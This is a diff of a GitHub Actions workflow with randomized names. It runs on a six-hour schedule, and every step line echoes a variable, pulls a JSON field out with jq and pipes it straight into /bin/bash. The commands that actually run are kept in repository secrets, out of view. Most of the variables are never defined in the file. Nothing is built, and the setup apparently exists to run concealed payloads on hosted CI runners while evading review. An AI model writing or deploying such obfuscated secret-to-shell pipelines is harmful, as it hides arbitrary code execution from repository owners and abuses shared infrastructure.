@@ -1,34 +1,38 @@
 name: lingjigou6351
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '31 3/6 * * *'
-
+    - cron: '53 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: lingjigou6351
         env:
-          la08940: ${{ secrets.la08940 }}
+          rh44: ${{ secrets.rh44 }}
         run: |
-          echo $la08940 | jq -r .uhzb7934 | /bin/bash
-          echo $fyw6174 | jq -r .tyhz01 | /bin/bash
-          echo $ies9 | jq -r .mequ07936 | /bin/bash
-          echo $bhav72 | jq -r .mafb15058 | /bin/bash
-          echo $cic35181 | jq -r .e66 | /bin/bash
-          echo $r6010 | jq -r .pnszk430 | /bin/bash
-          echo $hwku75 | jq -r .psyxn07 | /bin/bash
-          echo $sggcj63859 | jq -r .utwj64 | /bin/bash
-          echo $hvpnu8 | jq -r .xczn2973 | /bin/bash
-          echo $ac36524 | jq -r .brh8 | /bin/bash
-          echo $dvdw96877 | jq -r .abpd846 | /bin/bash
-          echo $ao01323 | jq -r .o330 | /bin/bash
-          echo $gz4315 | jq -r .civt4 | /bin/bash
-          echo $hiwgm866 | jq -r .hyoyb99520 | /bin/bash
-          echo $affzz73216 | jq -r .nfasm234 | /bin/bash
-          echo $xuvc707 | jq -r .he1 | /bin/bash
-          echo $c45 | jq -r .ufup7 | /bin/bash
+          echo $rh44 | jq -r .m8 | /bin/bash
+          echo $ghla80 | jq -r .ef37 | /bin/bash
+          echo $venre3 | jq -r .fz61 | /bin/bash
+          echo $orejz979 | jq -r .vepv479 | /bin/bash
+          echo $e75596 | jq -r .hywmu67 | /bin/bash
+          echo $bnvv72366 | jq -r .g12322 | /bin/bash
+          echo $ggmob00916 | jq -r .ngf6 | /bin/bash
+          echo $bv0 | jq -r .ihzj86 | /bin/bash
+          echo $c4515 | jq -r .suha18248 | /bin/bash
+          echo $mfyh9 | jq -r .dpiy426 | /bin/bash
+          echo $zzkb2 | jq -r .jvv86 | /bin/bash
+          echo $kb9 | jq -r .i095 | /bin/bash
+          echo $deeq41 | jq -r .au61 | /bin/bash
+          echo $zvuuq6196 | jq -r .lfiuw5 | /bin/bash
+          echo $ysr83337 | jq -r .yox13 | /bin/bash
+          echo $f5 | jq -r .v6 | /bin/bash
+          echo $fbnz7256 | jq -r .skm5 | /bin/bash
+          echo $zgxlx576 | jq -r .bdx92227 | /bin/bash
+          echo $u60 | jq -r .j8265 | /bin/bash
+          echo $em31491 | jq -r .wh12043 | /bin/bash
+          echo $y77 | jq -r .h35650 | /bin/bash
+          echo $vushw5 | jq -r .ofgl04083 | /bin/bash
 
